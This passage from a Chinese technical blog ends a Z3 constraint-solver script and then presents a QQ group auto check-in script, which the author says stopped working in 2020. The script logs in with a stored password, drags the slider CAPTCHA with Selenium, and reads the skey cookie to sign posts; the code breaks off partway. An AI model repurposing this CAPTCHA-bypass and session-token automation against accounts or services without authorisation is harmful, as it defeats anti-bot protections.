class="number">17</span>]+<span class="number">1031</span>*a[<span class="number">18</span>]+<span class="number">1033</span>*a[<span class="number">19</span>]+<span class="number">1039</span>*a[<span class="number">20</span>]+<span class="number">1049</span>*a[<span class="number">21</span>]==<span class="number">2280667</span>)</span><br><span class="line">s.add(<span class="number">1051</span>*a[<span class="number">0</span>]+<span class="number">1061</span>*a[<span class="number">1</span>]+<span class="number">1063</span>*a[<span class="number">2</span>]+<span class="number">1069</span>*a[<span class="number">3</span>]+<span class="number">1087</span>*a[<span class="number">4</span>]+<span class="number">1091</span>*a[<span class="number">5</span>]+<span class="number">1093</span>*a[<span class="number">6</span>]+<span class="number">1097</span>*a[<span class="number">7</span>]+<span class="number">1103</span>*a[<span class="number">8</span>]+<span class="number">1109</span>*a[<span class="number">9</span>]+<span class="number">1117</span>*a[<span class="number">10</span>]+<span class="number">1123</span>*a[<span class="number">11</span>]+<span class="number">1129</span>*a[<span class="number">12</span>]+<span class="number">1151</span>*a[<span class="number">13</span>]+<span class="number">1153</span>*a[<span class="number">14</span>]+<span class="number">1163</span>*a[<span class="number">15</span>]+<span class="number">1171</span>*a[<span class="number">16</span>]+<span class="number">1181</span>*a[<span class="number">17</span>]+<span class="number">1187</span>*a[<span class="number">18</span>]+<span class="number">1193</span>*a[<span class="number">19</span>]+<span class="number">1201</span>*a[<span class="number">20</span>]+<span class="number">1213</span>*a[<span class="number">21</span>]==<span class="number">2625651</span>)</span><br><span class="line">s.add(<span class="number">1217</span>*a[<span class="number">0</span>]+<span class="number">1223</span>*a[<span class="number">1</span>]+<span class="number">1229</span>*a[<span class="number">2</span>]+<span class="number">1231</span>*a[<span class="number">3</span>]+<span class="number">1237</span>*a[<span class="number">4</span>]+<span class="number">1249</span>*a[<span class="number">5</span>]+<span class="number">1259</span>*a[<span class="number">6</span>]+<span class="number">1277</span>*a[<span class="number">7</span>]+<span class="number">1279</span>*a[<span class="number">8</span>]+<span class="number">1283</span>*a[<span class="number">9</span>]+<span class="number">1289</span>*a[<span class="number">10</span>]+<span class="number">1291</span>*a[<span class="number">11</span>]+<span class="number">1297</span>*a[<span class="number">12</span>]+<span class="number">1301</span>*a[<span class="number">13</span>]+<span class="number">1303</span>*a[<span class="number">14</span>]+<span class="number">1307</span>*a[<span class="number">15</span>]+<span class="number">1319</span>*a[<span class="number">16</span>]+<span class="number">1321</span>*a[<span class="number">17</span>]+<span class="number">1327</span>*a[<span class="number">18</span>]+<span class="number">1361</span>*a[<span class="number">19</span>]+<span class="number">1367</span>*a[<span class="number">20</span>]+<span class="number">1373</span>*a[<span class="number">21</span>]==<span class="number">3001323</span>)</span><br><span class="line">s.add(<span class="number">1381</span>*a[<span class="number">0</span>]+<span class="number">1399</span>*a[<span class="number">1</span>]+<span class="number">1409</span>*a[<span class="number">2</span>]+<span class="number">1423</span>*a[<span class="number">3</span>]+<span class="number">1427</span>*a[<span class="number">4</span>]+<span class="number">1429</span>*a[<span class="number">5</span>]+<span class="number">1433</span>*a[<span class="number">6</span>]+<span class="number">1439</span>*a[<span class="number">7</span>]+<span class="number">1447</span>*a[<span class="number">8</span>]+<span class="number">1451</span>*a[<span class="number">9</span>]+<span class="number">1453</span>*a[<span class="number">10</span>]+<span class="number">1459</span>*a[<span class="number">11</span>]+<span class="number">1471</span>*a[<span class="number">12</span>]+<span class="number">1481</span>*a[<span class="number">13</span>]+<span class="number">1483</span>*a[<span class="number">14</span>]+<span class="number">1487</span>*a[<span class="number">15</span>]+<span class="number">1489</span>*a[<span class="number">16</span>]+<span class="number">1493</span>*a[<span class="number">17</span>]+<span class="number">1499</span>*a[<span class="number">18</span>]+<span class="number">1511</span>*a[<span class="number">19</span>]+<span class="number">1523</span>*a[<span class="number">20</span>]+<span class="number">1531</span>*a[<span class="number">21</span>]==<span class="number">3399957</span>)</span><br><span class="line">s.add(<span class="number">1543</span>*a[<span class="number">0</span>]+<span class="number">1549</span>*a[<span class="number">1</span>]+<span class="number">1553</span>*a[<span class="number">2</span>]+<span class="number">1559</span>*a[<span class="number">3</span>]+<span class="number">1567</span>*a[<span class="number">4</span>]+<span class="number">1571</span>*a[<span class="number">5</span>]+<span class="number">1579</span>*a[<span class="number">6</span>]+<span class="number">1583</span>*a[<span class="number">7</span>]+<span class="number">1597</span>*a[<span class="number">8</span>]+<span class="number">1601</span>*a[<span class="number">9</span>]+<span class="number">1607</span>*a[<span class="number">10</span>]+<span class="number">1609</span>*a[<span class="number">11</span>]+<span class="number">1613</span>*a[<span class="number">12</span>]+<span class="number">1619</span>*a[<span class="number">13</span>]+<span class="number">1621</span>*a[<span class="number">14</span>]+<span class="number">1627</span>*a[<span class="number">15</span>]+<span class="number">1637</span>*a[<span class="number">16</span>]+<span class="number">1657</span>*a[<span class="number">17</span>]+<span class="number">1663</span>*a[<span class="number">18</span>]+<span class="number">1667</span>*a[<span class="number">19</span>]+<span class="number">1669</span>*a[<span class="number">20</span>]+<span class="number">1693</span>*a[<span class="number">21</span>]==<span class="number">3746423</span>)</span><br><span class="line">s.add(<span class="number">1697</span>*a[<span class="number">0</span>]+<span class="number">1699</span>*a[<span class="number">1</span>]+<span class="number">1709</span>*a[<span class="number">2</span>]+<span class="number">1721</span>*a[<span class="number">3</span>]+<span class="number">1723</span>*a[<span class="number">4</span>]+<span class="number">1733</span>*a[<span class="number">5</span>]+<span class="number">1741</span>*a[<span class="number">6</span>]+<span class="number">1747</span>*a[<span class="number">7</span>]+<span class="number">1753</span>*a[<span class="number">8</span>]+<span class="number">1759</span>*a[<span class="number">9</span>]+<span class="number">1777</span>*a[<span class="number">10</span>]+<span class="number">1783</span>*a[<span class="number">11</span>]+<span class="number">1787</span>*a[<span class="number">12</span>]+<span class="number">1789</span>*a[<span class="number">13</span>]+<span class="number">1801</span>*a[<span class="number">14</span>]+<span class="number">1811</span>*a[<span class="number">15</span>]+<span class="number">1823</span>*a[<span class="number">16</span>]+<span class="number">1831</span>*a[<span class="number">17</span>]+<span class="number">1847</span>*a[<span class="number">18</span>]+<span class="number">1861</span>*a[<span class="number">19</span>]+<span class="number">1867</span>*a[<span class="number">20</span>]+<span class="number">1871</span>*a[<span class="number">21</span>]==<span class="number">4143323</span>)</span><br><span class="line">s.add(<span class="number">1873</span>*a[<span class="number">0</span>]+<span class="number">1877</span>*a[<span class="number">1</span>]+<span class="number">1879</span>*a[<span class="number">2</span>]+<span class="number">1889</span>*a[<span class="number">3</span>]+<span class="number">1901</span>*a[<span class="number">4</span>]+<span class="number">1907</span>*a[<span class="number">5</span>]+<span class="number">1913</span>*a[<span class="number">6</span>]+<span class="number">1931</span>*a[<span class="number">7</span>]+<span class="number">1933</span>*a[<span class="number">8</span>]+<span class="number">1949</span>*a[<span class="number">9</span>]+<span class="number">1951</span>*a[<span class="number">10</span>]+<span class="number">1973</span>*a[<span class="number">11</span>]+<span class="number">1979</span>*a[<span class="number">12</span>]+<span class="number">1987</span>*a[<span class="number">13</span>]+<span class="number">1993</span>*a[<span class="number">14</span>]+<span class="number">1997</span>*a[<span class="number">15</span>]+<span class="number">1999</span>*a[<span class="number">16</span>]+<span class="number">2003</span>*a[<span class="number">17</span>]+<span class="number">2011</span>*a[<span class="number">18</span>]+<span class="number">2017</span>*a[<span class="number">19</span>]+<span class="number">2027</span>*a[<span class="number">20</span>]+<span class="number">2029</span>*a[<span class="number">21</span>]==<span class="number">4553197</span>)</span><br><span class="line">s.add(<span class="number">2039</span>*a[<span class="number">0</span>]+<span class="number">2053</span>*a[<span class="number">1</span>]+<span class="number">2063</span>*a[<span class="number">2</span>]+<span class="number">2069</span>*a[<span class="number">3</span>]+<span class="number">2081</span>*a[<span class="number">4</span>]+<span class="number">2083</span>*a[<span class="number">5</span>]+<span class="number">2087</span>*a[<span class="number">6</span>]+<span class="number">2089</span>*a[<span class="number">7</span>]+<span class="number">2099</span>*a[<span class="number">8</span>]+<span class="number">2111</span>*a[<span class="number">9</span>]+<span class="number">2113</span>*a[<span class="number">10</span>]+<span class="number">2129</span>*a[<span class="number">11</span>]+<span class="number">2131</span>*a[<span class="number">12</span>]+<span class="number">2137</span>*a[<span class="number">13</span>]+<span class="number">2141</span>*a[<span class="number">14</span>]+<span class="number">2143</span>*a[<span class="number">15</span>]+<span class="number">2153</span>*a[<span class="number">16</span>]+<span class="number">2161</span>*a[<span class="number">17</span>]+<span class="number">2179</span>*a[<span class="number">18</span>]+<span class="number">2203</span>*a[<span class="number">19</span>]+<span class="number">2207</span>*a[<span class="number">20</span>]+<span class="number">2213</span>*a[<span class="number">21</span>]==<span class="number">4942889</span>)</span><br><span class="line">s.add(<span class="number">2221</span>*a[<span class="number">0</span>]+<span class="number">2237</span>*a[<span class="number">1</span>]+<span class="number">2239</span>*a[<span class="number">2</span>]+<span class="number">2243</span>*a[<span class="number">3</span>]+<span class="number">2251</span>*a[<span class="number">4</span>]+<span class="number">2267</span>*a[<span class="number">5</span>]+<span class="number">2269</span>*a[<span class="number">6</span>]+<span class="number">2273</span>*a[<span class="number">7</span>]+<span class="number">2281</span>*a[<span class="number">8</span>]+<span class="number">2287</span>*a[<span class="number">9</span>]+<span class="number">2293</span>*a[<span class="number">10</span>]+<span class="number">2297</span>*a[<span class="number">11</span>]+<span class="number">2309</span>*a[<span class="number">12</span>]+<span class="number">2311</span>*a[<span class="number">13</span>]+<span class="number">2333</span>*a[<span class="number">14</span>]+<span class="number">2339</span>*a[<span class="number">15</span>]+<span class="number">2341</span>*a[<span class="number">16</span>]+<span class="number">2347</span>*a[<span class="number">17</span>]+<span class="number">2351</span>*a[<span class="number">18</span>]+<span class="number">2357</span>*a[<span class="number">19</span>]+<span class="number">2371</span>*a[<span class="number">20</span>]+<span class="number">2377</span>*a[<span class="number">21</span>]==<span class="number">5356539</span>)</span><br><span class="line">s.add(<span class="number">2381</span>*a[<span class="number">0</span>]+<span class="number">2383</span>*a[<span class="number">1</span>]+<span class="number">2389</span>*a[<span class="number">2</span>]+<span class="number">2393</span>*a[<span class="number">3</span>]+<span class="number">2399</span>*a[<span class="number">4</span>]+<span class="number">2411</span>*a[<span class="number">5</span>]+<span class="number">2417</span>*a[<span class="number">6</span>]+<span class="number">2423</span>*a[<span class="number">7</span>]+<span class="number">2437</span>*a[<span class="number">8</span>]+<span class="number">2441</span>*a[<span class="number">9</span>]+<span class="number">2447</span>*a[<span class="number">10</span>]+<span class="number">2459</span>*a[<span class="number">11</span>]+<span class="number">2467</span>*a[<span class="number">12</span>]+<span class="number">2473</span>*a[<span class="number">13</span>]+<span class="number">2477</span>*a[<span class="number">14</span>]+<span class="number">2503</span>*a[<span class="number">15</span>]+<span class="number">2521</span>*a[<span class="number">16</span>]+<span class="number">2531</span>*a[<span class="number">17</span>]+<span class="number">2539</span>*a[<span class="number">18</span>]+<span class="number">2543</span>*a[<span class="number">19</span>]+<span class="number">2549</span>*a[<span class="number">20</span>]+<span class="number">2551</span>*a[<span class="number">21</span>]==<span class="number">5731505</span>)</span><br><span class="line">s.add(<span class="number">2557</span>*a[<span class="number">0</span>]+<span class="number">2579</span>*a[<span class="number">1</span>]+<span class="number">2591</span>*a[<span class="number">2</span>]+<span class="number">2593</span>*a[<span class="number">3</span>]+<span class="number">2609</span>*a[<span class="number">4</span>]+<span class="number">2617</span>*a[<span class="number">5</span>]+<span class="number">2621</span>*a[<span class="number">6</span>]+<span class="number">2633</span>*a[<span class="number">7</span>]+<span class="number">2647</span>*a[<span class="number">8</span>]+<span class="number">2657</span>*a[<span class="number">9</span>]+<span class="number">2659</span>*a[<span class="number">10</span>]+<span class="number">2663</span>*a[<span class="number">11</span>]+<span class="number">2671</span>*a[<span class="number">12</span>]+<span class="number">2677</span>*a[<span class="number">13</span>]+<span class="number">2683</span>*a[<span class="number">14</span>]+<span class="number">2687</span>*a[<span class="number">15</span>]+<span class="number">2689</span>*a[<span class="number">16</span>]+<span class="number">2693</span>*a[<span class="number">17</span>]+<span class="number">2699</span>*a[<span class="number">18</span>]+<span class="number">2707</span>*a[<span class="number">19</span>]+<span class="number">2711</span>*a[<span class="number">20</span>]+<span class="number">2713</span>*a[<span class="number">21</span>]==<span class="number">6177663</span>)</span><br><span class="line">s.add(<span class="number">2719</span>*a[<span class="number">0</span>]+<span class="number">2729</span>*a[<span class="number">1</span>]+<span class="number">2731</span>*a[<span class="number">2</span>]+<span class="number">2741</span>*a[<span class="number">3</span>]+<span class="number">2749</span>*a[<span class="number">4</span>]+<span class="number">2753</span>*a[<span class="number">5</span>]+<span class="number">2767</span>*a[<span class="number">6</span>]+<span class="number">2777</span>*a[<span class="number">7</span>]+<span class="number">2789</span>*a[<span class="number">8</span>]+<span class="number">2791</span>*a[<span class="number">9</span>]+<span class="number">2797</span>*a[<span class="number">10</span>]+<span class="number">2801</span>*a[<span class="number">11</span>]+<span class="number">2803</span>*a[<span class="number">12</span>]+<span class="number">2819</span>*a[<span class="number">13</span>]+<span class="number">2833</span>*a[<span class="number">14</span>]+<span class="number">2837</span>*a[<span class="number">15</span>]+<span class="number">2843</span>*a[<span class="number">16</span>]+<span class="number">2851</span>*a[<span class="number">17</span>]+<span class="number">2857</span>*a[<span class="number">18</span>]+<span class="number">2861</span>*a[<span class="number">19</span>]+<span class="number">2879</span>*a[<span class="number">20</span>]+<span class="number">2887</span>*a[<span class="number">21</span>]==<span class="number">6522731</span>)</span><br><span class="line">s.add(<span class="number">2897</span>*a[<span class="number">0</span>]+<span class="number">2903</span>*a[<span class="number">1</span>]+<span class="number">2909</span>*a[<span class="number">2</span>]+<span class="number">2917</span>*a[<span class="number">3</span>]+<span class="number">2927</span>*a[<span class="number">4</span>]+<span class="number">2939</span>*a[<span class="number">5</span>]+<span class="number">2953</span>*a[<span class="number">6</span>]+<span class="number">2957</span>*a[<span class="number">7</span>]+<span class="number">2963</span>*a[<span class="number">8</span>]+<span class="number">2969</span>*a[<span class="number">9</span>]+<span class="number">2971</span>*a[<span class="number">10</span>]+<span class="number">2999</span>*a[<span class="number">11</span>]+<span class="number">3001</span>*a[<span class="number">12</span>]+<span class="number">3011</span>*a[<span class="number">13</span>]+<span class="number">3019</span>*a[<span class="number">14</span>]+<span class="number">3023</span>*a[<span class="number">15</span>]+<span class="number">3037</span>*a[<span class="number">16</span>]+<span class="number">3041</span>*a[<span class="number">17</span>]+<span class="number">3049</span>*a[<span class="number">18</span>]+<span class="number">3061</span>*a[<span class="number">19</span>]+<span class="number">3067</span>*a[<span class="number">20</span>]+<span class="number">3079</span>*a[<span class="number">21</span>]==<span class="number">6954217</span>)</span><br><span class="line">s.add(<span class="number">3083</span>*a[<span class="number">0</span>]+<span class="number">3089</span>*a[<span class="number">1</span>]+<span class="number">3109</span>*a[<span class="number">2</span>]+<span class="number">3119</span>*a[<span class="number">3</span>]+<span class="number">3121</span>*a[<span class="number">4</span>]+<span class="number">3137</span>*a[<span class="number">5</span>]+<span class="number">3163</span>*a[<span class="number">6</span>]+<span class="number">3167</span>*a[<span class="number">7</span>]+<span class="number">3169</span>*a[<span class="number">8</span>]+<span class="number">3181</span>*a[<span class="number">9</span>]+<span class="number">3187</span>*a[<span class="number">10</span>]+<span class="number">3191</span>*a[<span class="number">11</span>]+<span class="number">3203</span>*a[<span class="number">12</span>]+<span class="number">3209</span>*a[<span class="number">13</span>]+<span class="number">3217</span>*a[<span class="number">14</span>]+<span class="number">3221</span>*a[<span class="number">15</span>]+<span class="number">3229</span>*a[<span class="number">16</span>]+<span class="number">3251</span>*a[<span class="number">17</span>]+<span class="number">3253</span>*a[<span class="number">18</span>]+<span class="number">3257</span>*a[<span class="number">19</span>]+<span class="number">3259</span>*a[<span class="number">20</span>]+<span class="number">3271</span>*a[<span class="number">21</span>]==<span class="number">7419507</span>)</span><br><span class="line">s.add(<span class="number">3299</span>*a[<span class="number">0</span>]+<span class="number">3301</span>*a[<span class="number">1</span>]+<span class="number">3307</span>*a[<span class="number">2</span>]+<span class="number">3313</span>*a[<span class="number">3</span>]+<span class="number">3319</span>*a[<span class="number">4</span>]+<span class="number">3323</span>*a[<span class="number">5</span>]+<span class="number">3329</span>*a[<span class="number">6</span>]+<span class="number">3331</span>*a[<span class="number">7</span>]+<span class="number">3343</span>*a[<span class="number">8</span>]+<span class="number">3347</span>*a[<span class="number">9</span>]+<span class="number">3359</span>*a[<span class="number">10</span>]+<span class="number">3361</span>*a[<span class="number">11</span>]+<span class="number">3371</span>*a[<span class="number">12</span>]+<span class="number">3373</span>*a[<span class="number">13</span>]+<span class="number">3389</span>*a[<span class="number">14</span>]+<span class="number">3391</span>*a[<span class="number">15</span>]+<span class="number">3407</span>*a[<span class="number">16</span>]+<span class="number">3413</span>*a[<span class="number">17</span>]+<span class="number">3433</span>*a[<span class="number">18</span>]+<span class="number">3449</span>*a[<span class="number">19</span>]+<span class="number">3457</span>*a[<span class="number">20</span>]+<span class="number">3461</span>*a[<span class="number">21</span>]==<span class="number">7843195</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="keyword">print</span> s.model()</span><br><span class="line">    m = s.model()</span><br><span class="line">    L = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">22</span>):</span><br><span class="line">        L.append(m[a[i]])</span><br><span class="line">    <span class="keyword">print</span> L</span><br><span class="line">t2 = time.time()</span><br><span class="line">print(t2-t1),<span class="string">'s'</span></span><br></pre></td></tr></table></figure><h1 id="一些关于Z3的博文"><a href="#一些关于Z3的博文" class="headerlink" title="一些关于Z3的博文"></a>一些关于Z3的博文</h1><p><a href="https://www.freebuf.com/articles/database/170814.html" target="_blank" rel="noopener">传送门</a></p><p><a href="https://www.52pojie.cn/thread-889071-1-1.html" target="_blank" rel="noopener">传送门</a></p><p><a href="https://blog.csdn.net/qq_33438733/article/details/82011892" target="_blank" rel="noopener">传送门</a></p>]]></content>
      <categories>
        <category>随手小记</category>
      </categories>
  </entry>
  <entry>
    <title>[原创] QQ群自动签到脚本(已失效)</title>
    <url>/2020/07/03/%E5%8E%9F%E5%88%9B-QQ%E7%BE%A4%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/Hatsune_miku_1563684099804.jpeg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong>2020年8月15，腾讯升级群功能，导致该脚本已失效！内容仅供参考。</strong></p><p>许久未更博。</p><p>忽然想刷一下QQ的群聊等级，然后看了看升级的规则，有一项是群签到。</p><p>通过群签到每天最多获得15积分。</p><p>而群签到的“本群首签”会获得3积分，这样的话，自己准备5个群就能获得每天的积分了。</p><p>当然如果想更快提高群聊等级，还可以每天向某个群上传十个文件。</p><p><strong>不过每天都运行这个脚本的话，还是比较麻烦的，所以直接弄成自动化的就好了。即把脚本挂到服务器上，设置成一个定时任务。 Nice~</strong></p><p>脚本是我自己写的，许多地方其实还是可以优化的，比如加一些异常捕获机制，但是懒…就没去弄。</p><h1 id="0x01-原理说明"><a href="#0x01-原理说明" class="headerlink" title="0x01 原理说明"></a>0x01 原理说明</h1><p><strong>基于python的requests库和selenium库来实现各功能。</strong></p><p>通过抓包可以得知: Q群签到实际上是通过向URL ‘<a href="https://qun.qq.com/cgi-bin/qiandao/sign/publish&#39;" target="_blank" rel="noopener">https://qun.qq.com/cgi-bin/qiandao/sign/publish&#39;</a> 进行post传参。</p><p>首先我们需要cookie中的两个主要部分：uin和skey</p><p>uin是根据QQ号来的，是不会变的，它有一个规律：</p><p>如果你QQ号小于等于9位，则自动在前面补0凑成10位，然后在最前面补一个小写字母’o’；如果你QQ号是10位的，则只进行在最前面补’o’的操作。</p><p>比如QQ号 123456789的uin 就是 o0123456789</p><p>QQ号1122334455的uin就是o1122334455</p><p><strong>emmmm11位QQ的未进行测试，可自行测试。(登陆QQ空间看cookie即可)</strong></p><p>而skey是随机生成的，一般以字符‘@’开头，总长度好像是10位?还是11位来着…..</p><p>这个也可以通过登陆QQ空间看cookie获取。</p><p><strong>曾经试过一段时间，手动登陆QQ空间拿到skey，然后用这个skey跑签到脚本，它只能用两天…. 至于是24小时还是48小时我也没去仔细测…毕竟就算能用一星期，来回手动换也是很麻烦的，而我的目的是实现全自动。</strong></p><p>而其他的一些参数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'bkn'</span>: bkn,<span class="comment">#这是根据skey按照一个算法生成的,等下会介绍</span></span><br><span class="line">    <span class="string">"category_id"</span>: <span class="number">9</span>,<span class="comment">#类别ID,这是Q群签到的一个选项来着...抓包拿到的是9,可以自行更改</span></span><br><span class="line">    <span class="string">"page"</span>: <span class="number">0</span>,<span class="comment">#好像和其他几个有关联?</span></span><br><span class="line">    <span class="string">"pic_id"</span>: <span class="number">124</span>,<span class="comment">#签到图片ID</span></span><br><span class="line">    <span class="string">'gc'</span>: gc,<span class="comment">#QQ群号</span></span><br><span class="line">    <span class="string">'client'</span>: <span class="string">'2'</span>,<span class="comment">#我也不知道,反正我抓包拿到的是2...应该能自行更改</span></span><br><span class="line">    <span class="string">'lgt'</span>: <span class="string">'0'</span>,<span class="comment">#经度</span></span><br><span class="line">    <span class="string">'lat'</span>: <span class="string">'0'</span>,<span class="comment">#纬度</span></span><br><span class="line">    <span class="string">'poi'</span>: <span class="string">'签到地点'</span>,<span class="comment">#可以自行更改</span></span><br><span class="line">    <span class="string">'text'</span>: <span class="string">'你想说的话'</span><span class="comment">#可以自行更改</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Getgtk</span><span class="params">(self)</span>:</span></span><br><span class="line">    hashes = <span class="number">5381</span></span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> self.skey:</span><br><span class="line">        hashes += (hashes &lt;&lt; <span class="number">5</span>) + ord(letter)</span><br><span class="line">    <span class="keyword">return</span> hashes &amp; <span class="number">0x7fffffff</span></span><br></pre></td></tr></table></figure><p>这个就是通过skey来求上面说的bkn参数的算法，来源于百度…</p><p>经过测试，如果签到成功的话，打印出来的content为<code>{&quot;cgicode&quot;:0,&quot;retcode&quot;:0,&quot;msg&quot;:&quot;&quot;,&quot;data&quot;:{}}</code>，所以可以用这个进行判断是否签到成功…当然直接看QQ也可以…</p><h1 id="0x02-需要解决的几个困难"><a href="#0x02-需要解决的几个困难" class="headerlink" title="0x02 需要解决的几个困难"></a>0x02 需要解决的几个困难</h1><h2 id="如何自动获取skey"><a href="#如何自动获取skey" class="headerlink" title="如何自动获取skey?"></a>如何自动获取skey?</h2><p>由于QQ空间登陆的时候有滑块验证，这里想用requests库来实现登陆并获取cookie并不太好弄。</p><p>这里选择先用selenium库实现QQ空间登陆，获取到cookie（主要是获取cookie里的skey）后直接让requests库利用。（毕竟skey的生存期至少是24小时）</p><p><strong>非常幸运的是：QQ空间登陆的时候，滑块只需要拖动170到180之间某个像素位即可，这个值是随机的。</strong></p><p>我们取中位数175，然后借助selenium的ActionChains来模拟拖动滑块。</p><p>因为是随机的，多试几次碰碰运气，总能成功的。</p><h2 id="挂到服务器上执行脚本并没有效果且未报错"><a href="#挂到服务器上执行脚本并没有效果且未报错" class="headerlink" title="挂到服务器上执行脚本并没有效果且未报错"></a>挂到服务器上执行脚本并没有效果且未报错</h2><p>这个脚本早在几天前就写好了，但是挂到服务器上一直没有效果…</p><p>我一直在找原因，直到昨天，我决定给服务器加个桌面化，通过VNC进行连接服务器，以可视化的方式看看到底出了什么问题。</p><p>然后我发现，在拖动好滑块以后，还需要进行手机验证码验证…</p><p><strong>大概是腾讯出于安全的考虑，毕竟在服务器登录也算是异地登录…</strong></p><p>我尝试着进行了手机验证码验证，但是在下一次模拟登陆的时候依然是需要手机验证码登录…</p><p>而且我也检查了我QQ的各种登录保护，<strong>确定没开登陆地保护和设备锁之类的保护措施</strong>。</p><p>无奈之下，我尝试了进行二维码扫码登录，这不需要手机验证码验证，但是这不符合我的全自动化要求。</p><p>多次尝试各种方法以后，依然需要手机验证码验证…</p><p>过了许久，突发奇想，我在服务器(ubuntu18.04)借助远程连接图形化界面下载一个Linux版本的QQ，登陆几次，会不会解决这个问题。</p><p>也可能是这个方法生效了，模拟登陆的时候不再需要手机验证码验证了。(o^_^o)</p><h1 id="0x03-脚本源码"><a href="#0x03-脚本源码" class="headerlink" title="0x03 脚本源码"></a>0x03 脚本源码</h1><p>脚本所用python版本:2.7.17</p><p>脚本由UserInfo.py与test.py组成，懒得改名了，就这么命名吧。</p><p>其中UserInfo.py算是存放需要进行Q群签到的QQ的信息吧</p><p>结构如下</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/image-20200703233309935.png" alt></p><p>即 [ uin,QQ号,QQ密码,[需要签到的Q群list] ] 这种结构。</p><p>test.py内容如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> UserInfo <span class="keyword">import</span> usersInfo</span><br><span class="line"></span><br><span class="line">__Author__ = <span class="string">'LiuLian'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sign</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,uin,Qnum,Qpsd,QqunList)</span>:</span></span><br><span class="line">        self.uin = uin</span><br><span class="line">        self.skey = <span class="string">''</span></span><br><span class="line">        self.Qnum = Qnum</span><br><span class="line">        self.Qpsd = Qpsd</span><br><span class="line">        self.QqunList = QqunList</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Getskey</span><span class="params">(self)</span>:</span></span><br><span class="line">        count = <span class="number">1</span></span><br><span class="line">        hasfound = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[*]'</span> + self.Qnum + <span class="string">' 正在进行第'</span> + str(count) +<span class="string">'次尝试...'</span></span><br><span class="line">            opt = webdriver.ChromeOptions()</span><br><span class="line">            opt.add_argument(<span class="string">'--headless'</span>)</span><br><span class="line">            opt.add_argument(<span class="string">'--no-sandbox'</span>)</span><br><span class="line">            driver = webdriver.Chrome(options=opt)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            driver.get(<span class="string">'https://qzone.qq.com'</span>)</span><br><span class="line">            <span class="comment">#print driver.page_source.encode('utf-8')</span></span><br><span class="line">            driver.switch_to.frame(<span class="string">'login_frame'</span>)</span><br><span class="line">            a_tag = driver.find_element_by_id(<span class="string">'switcher_plogin'</span>)</span><br><span class="line">            a_tag.click()</span><br><span class="line">            userName_tag = driver.find_element_by_id(<span class="string">'u'</span>)</span><br><span class="line">            passWord_tag = driver.find_element_by_id(<span class="string">'p'</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            userName_tag.send_keys(self.Qnum)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            passWord_tag.send_keys(self.Qpsd)</span><br><span class="line">            btn = driver.find_element_by_id(<span class="string">"login_button"</span>)</span><br><span class="line">            btn.click()</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            iframe = driver.find_element_by_xpath(<span class="string">'//*[@id="tcaptcha_iframe"]'</span>)  <span class="comment"># 找到“嵌套”的iframe</span></span><br><span class="line">            driver.switch_to.frame(iframe)  <span class="comment"># 切换到iframe</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            button = driver.find_element_by_id(<span class="string">'tcaptcha_drag_button'</span>)  <span class="comment"># 寻找滑块</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># 开始拖动 perform()用来执行ActionChains中存储的行为</span></span><br><span class="line">            distance = <span class="number">175</span></span><br><span class="line">            action = ActionChains(driver)</span><br><span class="line">            action.reset_actions()  <span class="comment"># 清除之前的action</span></span><br><span class="line">            action.click_and_hold(button).perform()  <span class="comment"># click_and_hold 点击并保持</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            action.move_by_offset(distance, <span class="number">0</span>).release().perform()</span><br><span class="line">            time.sleep(<span class="number">10</span>)</span><br><span class="line">            cookies = driver.get_cookies()</span><br><span class="line">            <span class="keyword">for</span> dic <span class="keyword">in</span> cookies:</span><br><span class="line">                <span class="keyword">if</span> dic.values()[<span class="number">1</span>] == <span class="string">u'skey'</span>:</span><br><span class="line">                    self.skey = dic.values()[<span class="number">2</span>].encode(<span class="string">"utf8"</span>, <span class="string">"ignore"</span>)</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'[+]'</span> + self.Qnum + <span class="string">'的skey = '</span> + self.skey</span><br><span class="line">                    hasfound = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># 退出浏览器</span></span><br><span class="line">            driver.quit()</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> hasfound:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> count &gt; <span class="number">100</span>:</span><br><span class="line">                